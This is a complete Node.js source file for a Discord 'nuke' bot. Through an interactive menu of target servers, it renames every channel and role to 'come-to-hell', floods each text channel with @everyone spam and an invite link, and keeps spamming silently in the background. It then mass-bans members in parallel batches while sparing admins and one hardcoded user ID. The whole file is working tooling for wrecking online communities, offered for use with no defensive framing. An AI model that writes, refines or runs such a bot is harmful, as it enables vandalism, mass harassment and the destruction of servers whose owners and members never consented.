import { Client, GatewayIntentBits, ChannelType, Events, PermissionFlagsBits } from "discord.js";
import { checkbox } from "@inquirer/prompts";
import dotenv from "dotenv";
import readline from "readline";

dotenv.config();

// ===== CLIENT =====

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

// ===== CONSTANTS =====

const NUKE_NAME    = "come-to-hell";
const NUKE_MESSAGE = `# I made this hell, Now come to hell!\n*I turned heaven into hell @everyone hahaha*\nhttps://discord.gg/c2h`;
const PROTECTED_ID = "1291403526311772298";

const BURST_COUNT     = 100;  // Amount of messages to sent as inital
const BURST_DELAY_MS  = 500;  // delay between each message inside one channel's burst
const BAN_CONCURRENCY = 10;   // how many bans fire in parallel at once
const BAN_CHUNK_DELAY = 300;  // ms between ban chunks
const INTERVAL_MS     = 5000; // silent background spam cadence

const nukedGuildIds = new Set(); // track servers nuked in current runtime

// ===== HELPERS =====

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/**
 * Run `fn` on every item in `items`, but at most `concurrency` at a time.
 * Fires each chunk in parallel, waits for the chunk, then fires the next.
 */
async function parallelChunked(items, fn, concurrency = 10, chunkDelay = 0) {
  const arr = [...items];
  for (let i = 0; i < arr.length; i += concurrency) {
    await Promise.all(arr.slice(i, i + concurrency).map(fn));
    if (chunkDelay > 0 && i + concurrency < arr.length) await sleep(chunkDelay);
  }
}

// ===== PHASE 1 — PARALLEL RENAME ALL =====

async function renameAll(guild) {
  console.log(`\n[${guild.name}] ── Phase 1: Rename All ──`);

  const channels = await guild.channels.fetch();
  const all = [...channels.values()].filter(Boolean);

  // Fire every rename simultaneously — Discord will rate-limit us gracefully
  await Promise.all(
    all.map(async (ch) => {
      try {
        await ch.setName(NUKE_NAME);
        console.log(`  ✅ Renamed: #${ch.name}`);
      } catch (err) {
        console.error(`  ❌ Rename failed [${ch.name}]: ${err.message}`);
      }
    })
  );

  console.log(`[${guild.name}] ── Rename phase done ──`);
}

// ===== PHASE 2 — PARALLEL RENAME ALL ROLES =====

async function renameAllRoles(guild) {
  console.log(`\n[${guild.name}] ── Phase 2: Rename All Roles ──`);

  const roles = await guild.roles.fetch();
  const all = [...roles.values()].filter(
    (r) => !r.managed && r.id !== guild.id // skip @everyone and bot-managed roles
  );

  await Promise.all(
    all.map(async (role) => {
      try {
        await role.setName(NUKE_NAME);
        console.log(`  ✅ Role renamed: @${role.name}`);
      } catch (err) {
        console.error(`  ❌ Role rename failed [@${role.name}]: ${err.message}`);
      }
    })
  );

  console.log(`[${guild.name}] ── Role rename phase done ──`);
}

// ===== PHASE 3 — PARALLEL BURST ALL TEXT CHANNELS =====

/**
 * Sends BURST_COUNT messages to a single channel with BURST_DELAY_MS gap.
 * All channels run this simultaneously via Promise.all in burstAll().
 */
async function burstChannel(channel) {
  for (let i = 0; i < BURST_COUNT; i++) {
    try {
      await channel.send(NUKE_MESSAGE);
      await sleep(BURST_DELAY_MS);
    } catch (err) {
      // on hard error (missing perms, deleted channel) abort this channel's burst
      console.error(`  ❌ Burst stopped [#${channel.name}] at msg ${i + 1}: ${err.message}`);
      return;
    }
  }
}

/**
 * Kick off a completely silent background interval for a channel.
 * Runs forever — only stops if the channel errors (deleted / perms gone)
 * or client.destroy() is called on exit.
 */
function startSilentInterval(channel) {
  const handle = setInterval(async () => {
    try {
      await channel.send(NUKE_MESSAGE);
    } catch {
      // channel gone or perms revoked — stop silently, no console noise
      clearInterval(handle);
    }
  }, INTERVAL_MS);
}

async function burstAll(guild) {
  console.log(`\n[${guild.name}] ── Phase 3: Parallel Burst ──`);

  const channels = await guild.channels.fetch();
  const textChannels = [...channels.values()].filter(
    (ch) => ch && ch.isTextBased() && ch.type !== ChannelType.GuildCategory
  );

  console.log(`  📡 Bursting ${textChannels.length} text channels in parallel...`);

  // All channels burst simultaneously — 100 msgs × 500ms = ~50s total (not per channel)
  await Promise.all(textChannels.map((ch) => burstChannel(ch)));

  // After all bursts complete, start silent background intervals on every channel
  textChannels.forEach((ch) => startSilentInterval(ch));

  console.log(
    `[${guild.name}] ── Burst done. ` +
    `${textChannels.length} silent intervals running in background ──`
  );
}

// ===== PHASE 3 — PARALLEL BAN (CHUNKED) =====

function shouldSkipMember(member, botId, botMember) {
  if (member.user.id === botId)              return "self";
  if (member.user.id === PROTECTED_ID)       return "protected";
  if (member.id === member.guild.ownerId)    return "owner";
  if (member.permissions.has(PermissionFlagsBits.Administrator)) return "admin";
  if (botMember && member.roles.highest.position >= botMember.roles.highest.position)
    return "role-hierarchy";
  return null;
}

async function banAllMembers(guild) {
  console.log(`\n[${guild.name}] ── Phase 4: Mass Ban ──`);

  let members;
  try {
    members = await guild.members.fetch();
  } catch (err) {
    console.error(`  ❌ Could not fetch members: ${err.message}`);
    return;
  }

  const botId     = client.user.id;
  const botMember = guild.members.me;

  const toSkip = [];
  const toBan  = [];

  for (const member of members.values()) {
    const reason = shouldSkipMember(member, botId, botMember);
    if (reason) toSkip.push({ member, reason });
    else toBan.push(member);
  }

  toSkip.forEach(({ member, reason }) =>
    console.log(`  ⏭️  Skipped (${reason}): ${member.user.tag}`)
  );
  console.log(`  🔨 Banning ${toBan.length} members, ${BAN_CONCURRENCY} at a time...`);

  // Ban in parallel chunks of BAN_CONCURRENCY with BAN_CHUNK_DELAY between chunks
  await parallelChunked(
    toBan,
    async (member) => {
      try {
        await member.ban({ deleteMessageSeconds: 0, reason: "Mass ban" });
        console.log(`  ✅ Banned: ${member.user.tag}`);
      } catch (err) {
        console.error(`  ❌ Ban failed [${member.user.tag}]: ${err.message}`);
      }
    },
    BAN_CONCURRENCY,
    BAN_CHUNK_DELAY
  );

  console.log(`[${guild.name}] ── Ban phase done ──`);
}

// ===== MAIN NUKE GUILD =====

async function nukeGuild(guild) {
  const bar = "─".repeat(44);
  console.log(`\n${"═".repeat(44)}\n💣  ${guild.name}\n${"═".repeat(44)}`);

  await renameAll(guild);       // Phase 1 — all channels + categories renamed in parallel
  await renameAllRoles(guild);  // Phase 2 — all roles renamed in parallel
  await burstAll(guild);        // Phase 3 — all bursts in parallel, then silent intervals start
  await banAllMembers(guild);   // Phase 4 — bans in parallel chunks

  console.log(`\n${bar}`);
  console.log(`✨ [${guild.name}] — All phases done. Silent intervals running.`);
  console.log(bar);
}

async function nukeAllGuilds() {
  const oauthGuilds = await client.guilds.fetch();
  console.log(`\n🌐 Found ${oauthGuilds.size} guild(s)`);

  for (const oauthGuild of oauthGuilds.values()) {
    try {
      const guild = await client.guilds.fetch(oauthGuild.id);
      await nukeGuild(guild);
    } catch (err) {
      console.error(`❌ Could not nuke guild [${oauthGuild.id}]: ${err.message}`);
    }
  }
}

async function getGuildList() {
  const oauthGuilds = await client.guilds.fetch();
  const guilds = [];

  for (const oauthGuild of oauthGuilds.values()) {
    try {
      const guild = await client.guilds.fetch(oauthGuild.id);
      guilds.push({ id: guild.id, name: guild.name, nuked: nukedGuildIds.has(guild.id) });
    } catch {
      // ignore guilds we cannot fetch
    }
  }

  return guilds;
}

// ===== CLI =====
//
// The prompt re-appears only after all 3 phases complete (rename → burst → ban).
// Background intervals are already live by then — they are fully silent and never
// block or re-surface in the terminal. They stop only when 'exit' calls client.destroy().

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

function promptCommand() {
  rl.question("\nEnter command (nuke / exit): ", async (input) => {
    const cmd = input.trim().toLowerCase();

    if (cmd === "nuke") {
      console.log("🔥 Nuke sequence started...\n");

      const guilds = await getGuildList();
      if (!guilds.length) {
        console.log('⚠️  No accessible guilds found for nuking.');
      } else {
        const selectedGuildIds = await checkbox({
          message: 'Select guild(s) to nuke (space to select, enter to confirm):',
          choices: guilds.map((g) => ({
            name: `${g.name}${g.nuked ? ' (Nuked)' : ''}`,
            value: g.id,
            disabled: g.nuked ? 'already nuked' : false,
          })),
          hint: 'Use arrow keys + space; enter to continue',
          validate(answer) {
            if (!answer.length) return 'Choose at least one guild to nuke';
            return true;
          },
        });

        if (!selectedGuildIds || !selectedGuildIds.length) {
          console.log('⚠️  No guild selected.');
          promptCommand();
          return;
        }

        for (const guildId of selectedGuildIds) {
          const guildInfo = guilds.find((g) => g.id === guildId);
          if (!guildInfo) continue;

          try {
            const g = await client.guilds.fetch(guildId);
            await nukeGuild(g);
            nukedGuildIds.add(guildId);
            console.log(`🏴‍☠️  Marked nuked: ${guildInfo.name} (${guildId})`);
          } catch (err) {
            console.error(`❌ Error nuking ${guildInfo.name} (${guildId}): ${err.message}`);
          }
        }

        console.log('\n✅ Nuke command completed.');
        console.log("   Type 'nuke' to choose again or 'exit' to stop.");
      }
    } else if (cmd === "exit") {
      console.log("👋 Destroying client — all intervals will stop...");
      rl.close();
      await client.destroy(); // closing WebSocket kills all pending interval sends
      process.exit(0);
    } else {
      console.log(`❓ Unknown: "${cmd}". Try 'nuke' or 'exit'.`);
    }

    promptCommand(); // loop back
  });
}

// ===== EVENTS =====

client.once(Events.ClientReady, (c) => {
  console.log(`✅ Logged in as ${c.user.tag}`);
  promptCommand();
});

process.on("SIGINT", async () => {
  console.log("\n🛑 SIGINT — shutting down...");
  rl.close();
  await client.destroy();
  process.exit(0);
});

// ===== BOOT =====

client.login(process.env.DISCORD_TOKEN);
